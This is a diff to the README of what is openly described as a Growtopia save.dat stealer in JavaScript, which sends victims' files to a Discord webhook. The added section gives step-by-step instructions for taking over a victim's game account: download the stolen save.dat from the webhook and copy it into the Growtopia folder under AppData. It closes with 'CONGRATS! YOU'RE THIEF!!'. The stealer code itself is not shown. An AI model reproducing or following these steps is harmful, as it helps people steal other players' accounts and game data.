@@ -5,6 +5,13 @@ A growtopia save.dat stealer in javascript.
 # installations
 - npm i discord-webhook-node
 
+# how to use victim's account
+Growtopia was created (data-save) with a file named ```'save.dat'``` so if you guys succeed
+steal account. and already logged in your webhook, you can download the victim's ```SAVE.DAT``` file and transfer it to your growtopia data
+- > Path: ```C:/Users/PC-NAME/AppData/Local/Growtopia```
+- or right click on ```Growtopia``` then paste the victims save.dat
+- AND CONGRATS! YOU'RE THIEF!!
+
 # output
 ```js
 Get ready.. we'll stole a save.data :D
